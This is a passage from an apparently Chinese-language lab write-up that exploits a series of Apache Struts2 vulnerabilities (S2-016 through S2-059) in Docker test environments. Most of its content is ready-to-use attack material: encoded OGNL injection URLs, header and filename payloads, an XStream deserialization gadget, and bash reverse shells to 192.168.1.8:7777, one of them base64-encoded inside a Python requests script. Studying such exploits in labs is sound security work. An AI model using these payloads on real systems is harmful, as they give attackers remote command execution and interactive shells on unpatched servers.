class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</span><br></pre></td></tr></table></figure><p>这里在message处得到id需要进行url解码</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101003312.png" alt="image-20210913101003312"></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101010963.png" alt="image-20210913101010963"></p><h1 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h1><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p><p>进入s2-016的docker环境</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101017499.png" alt="image-20210913101017499"></p><p>构造payload执行，可以发现执行过后网址后面出现了id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101026460.png" alt="image-20210913101026460"></p><h1 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h1><p>当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。method: Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。.</p><p>进入s2-032的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101033069.png" alt="image-20210913101033069"></p><p>构造payload返回1001060253718则代表可代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10010</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101109789.png" alt="image-20210913101109789"></p><p>构造payload输出id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.8:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101105595.png" alt="image-20210913101105595"></p><h1 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h1><p>Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><p>影响范围</p><p>Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p><p>进入s2-045的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101118720.png" alt="image-20210913101118720"></p><p>构造payload任意命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:&quot;%&#123;(#xxx=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;&quot;pwd&quot;&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><p>对于payload的一些解释</p><p>来获取上下文容器</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;] </span><br></pre></td></tr></table></figure><p>通过容器实例化，对Ognl API的通用访问，设置和获取属性 </p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class </span><br></pre></td></tr></table></figure><p>判断目标主机的操作系统类型，并进行执行命令赋值 </p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd &#125;) </span><br></pre></td></tr></table></figure><p> 执行攻击命令</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/640" alt="图片"></p><h1 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h1><p>s2-046漏洞的利用有点特殊，需要满足以下几个条件：</p><p>1、系统必须使用 Jakarta 插件，检查 Struts2 配置文件中是否有以下配置：&lt;constant name =“struts.multipart.parser”value =“jakarta-stream”/&gt;</p><p>2、上传文件的大小（由 Content-LSength 头指定）大于 Struts2 允许的最大大小（2GB）</p><p>3、文件名内容构造恶意的 OGNL 内容。</p><p>如果满足以上要求，Struts2 受影响版本将创建一个包含攻击者控制的异常文件名，使用 OGNL 值堆栈来定位错误消息，OGNL 值堆栈将插入任何 OGNL 变量（$ {}或％{}）作为 OGNL 表达式，然后实现任意代码执行。</p><p>与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。</p><p>进入s2-046的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101149107.png" alt="image-20210913101149107"></p><p>点击submit进行抓包，可以看到这里的filename正常情况下是为空的</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102126904.png" alt="image-20210913102126904"></p><p>构造payload执行1+99</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,1+99)&#125;\x00b</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101210064.png" alt="image-20210913101210064"></p><p>这里需要进行00截断，进入hex将30改为00</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101222214.png" alt="image-20210913101222214"></p><p>然后发包，可以看到X-Test这个地方已经执行了1+99并输出了结果</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913102206329.png" alt="image-20210913102206329"></p><p>那么这里就可以构造一个poc进行bash反弹，还是要进行00阶段，nc监听端口，发包即可得到反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x00b&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101301413.png" alt="image-20210913101301413"></p><h1 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h1><p>这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。</p><p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同事这个 getText() 的 参数输入点，又可以被用户直接进行控制，用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。</p><p>进入s2-048的docker环境</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101310033.png" alt="image-20210913101310033"></p><p>进入<code>http://192.168.1.8:8080/integration/saveGangster.action</code>漏洞页面，尝试运算1+1</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101319379.png" alt="image-20210913101319379"></p><p>可以看到这里得到了运算结果，说明存在漏洞</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101328923.png" alt="image-20210913101328923"></p><p>那么这里构造一个payload用来输出id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102257991.png" alt="image-20210913102257991"></p><p>构造payload输出whoami</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102303685.png" alt="image-20210913102303685"></p><h1 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h1><p>s2-052产生漏洞的原因是REST插件使用到XStreamHandler处理xml数据，由于未对xml数据做任何过滤，在进行发序列xml数据转换为Object时导致RCE</p><p>进入s2-052的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101351194.png" alt="image-20210913101351194"></p><p>进入页面后随便点击一个成员进行编辑并点击submit进行抓包</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101403121.png" alt="image-20210913101403121"></p><p>这里可以看到Content-Type为<code>application/x-www-form-urlencoded</code></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101410808.png" alt="image-20210913101410808"></p><p>构造一个xml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;&lt;/entry&gt;&lt;/map&gt;</span><br></pre></td></tr></table></figure><p>首先将Content-Type改为<code>application/xml</code>，然后将xml文件插入，发包返回500证明已经成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101419847.png" alt="image-20210913101419847"></p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101430373.png" alt="image-20210913101430373"></p><p>进入tmp目录查看success文件已经创建成功</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913102331073.png" alt="image-20210913102331073"></p><h1 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h1><p>s2-053漏洞产生的原因是Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><p>进入s2-053的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101449643.png" alt="image-20210913101449643"></p><p>首先执行<code>%&#123;33-1&#125;</code>并提交，可以看到在Your url的地方运算出了结果，说明存在漏洞</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101458066.png" alt="image-20210913101458066"></p><p>构造payload输出id并提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101505666.png" alt="image-20210913101505666"></p><p>执行bash反弹命令，用nc监听端口即可得到反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101516678.png" alt="image-20210913101516678"></p><h1 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h1><p>s2-057漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生。</p><p>alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性。</p><p>进入s2-057的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101524474.png" alt="image-20210913101524474"></p><p>首先构造12+34回车</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101534689.png" alt="image-20210913101534689"></p><p>发现运算出了结果，说明存在漏洞</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101542769.png" alt="image-20210913101542769"></p><p>构造payload输出id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p>进行url编码</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101550904.png" alt="image-20210913101550904"></p><p>得到如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7B%20(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D</span><br></pre></td></tr></table></figure><p>bp抓包在GET处进行拼接得到id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-showcase/%24%7B%20(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101558935.png" alt="image-20210913101558935"></p><p>在exec处修改要执行得命令即可</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101611944.png" alt="image-20210913101611944"></p><h1 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h1><p>s2-059产生的原因为攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。</p><p>进入s2-059的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101621863.png" alt="image-20210913101621863"></p><p>访问8080看到有一个input:id</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101636847.png" alt="image-20210913101636847"></p><p>传参id=2进入发现出现在了input id:这个地方</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101644564.png" alt="image-20210913101644564"></p><p>这里构造<code>id=%25&#123;10*10&#125;</code>，发现自动进行了运算</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101652122.png" alt="image-20210913101652122"></p><p>使用bash反弹，先进行编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101703940.png" alt="image-20210913101703940"></p><p>编码后结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>生成一个test.py，将bash编码放入py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl = &quot;http://127.0.0.1:8080&quot;data1 = &#123;&quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123;&quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure><p>执行即可得到反弹shell</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101714450.png" alt="image-20210913101714450"></p><h1 